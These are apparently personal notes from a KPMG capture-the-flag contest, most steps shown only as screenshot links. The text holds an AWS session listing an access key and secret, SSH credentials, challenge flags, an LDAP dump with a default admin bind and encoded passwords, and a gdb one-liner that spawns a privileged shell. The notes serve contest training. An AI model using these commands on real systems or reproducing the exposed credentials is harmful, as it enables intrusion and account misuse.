

## I am Weak

decode the jwt token of the guest user with hashcat

![[Screenshot from 2024-08-09 15-48-47.png]]

![[Screenshot from 2024-08-09 15-48-17.png]]

![[Screenshot from 2024-08-09 15-48-01.png]]


## Data Vault Duel

![[Screenshot from 2024-08-09 18-29-41.png]]

## Credentials Everywhere

![[Screenshot from 2024-08-09 18-25-46.png]]


~~~
AKIAV4FCIFFG26E54KOC@5067448801e1:~/.aws$ aws s3 cp  s3://kpmg-ctf2/CTF_accessKeys.csv .
download: s3://kpmg-ctf2/CTF_accessKeys.csv to ./CTF_accessKeys.csv
AKIAV4FCIFFG26E54KOC@5067448801e1:~/.aws$ ls
CTF_accessKeys.csv  credentials  rituognriteuonhbiorentgbvhuitrhoirtsnbiuort.txt
AKIAV4FCIFFG26E54KOC@5067448801e1:~/.aws$ cat CTF_accessKeys.csv 
Access key ID,Secret access key
AKIAV4FCIFFGYXKX34Z2,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
AKIAV4FCIFFG26E54KOC@5067448801e1:~/.aws$ 
~~~


~~~
SSH Username: AKIAV4FCIFFG26E54KOC
SSH Password: MyVerySecureCloud123!
~~~

## Hacking the Admins



![[Screenshot from 2024-08-09 18-36-07.png]]


![[Pasted image 20240809185542.png]]


![[Screenshot from 2024-08-09 18-49-15.png]]

![[Pasted image 20240809185640.png]]

![[Screenshot from 2024-08-09 18-51-03.png]]


![[Pasted image 20240809185653.png]]

## Modulus Bus Station



![[Pasted image 20240809212648.png]]


![[Screenshot from 2024-08-09 21-26-20.png]]


~~~
KPMG_CTF{GxPrFeA5hB3kQ_KMrxOO8pK0aReXUQhPfnHu5rgFPkNmZ7wULxaCC7N39sQ-H0mwE8t1gkAIHb5CUlmDa5WoWK5JdCJccaK9SviI-Lsk}
~~~


~~~
ldapsearch -x -H ldap://0.cloud.chals.io:24591 -D "cn=admin,dc=cybercorp,dc=com" -w 'admin' -b "dc=cybercorp,dc=com"
~~~


~~~

# extended LDIF
#
# LDAPv3
# base <dc=cybercorp,dc=com> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# cybercorp.com
dn: dc=cybercorp,dc=com
objectClass: top
objectClass: dcObject
objectClass: organization
o: Cybercorp Inc.
dc: cybercorp

# users, cybercorp.com
dn: ou=users,dc=cybercorp,dc=com
objectClass: organizationalUnit
ou: users

# admin, cybercorp.com
dn: cn=admin,dc=cybercorp,dc=com
objectClass: inetOrgPerson
cn: admin
sn: Admin
userPassword:: YWRtaW4=
description: LDAP administrator

# John Doe, users, cybercorp.com
dn: cn=John Doe,ou=users,dc=cybercorp,dc=com
objectClass: inetOrgPerson
cn: John Doe
sn: Doe
uid: jdoe
userPassword:: S1BNR19JU19UT09fQ09PTEBGSVJFX0VNT0pJ
description: Here is your user flag: KPMG_CTF{6D5L5BYyJ6fV4CNZFC__cOA6mqAm46bJ
 weEFZiuM5o_p9-7xO7oKTswRI8bBN9rhSG6ZbHogH5CHTZPQ1GaCy0zqgM2FV5XzpOK_8-Oy} KPM
 G_IS_TOO_COOL@FIRE_EMOJI

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 4

~~~


~~~
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
~~~




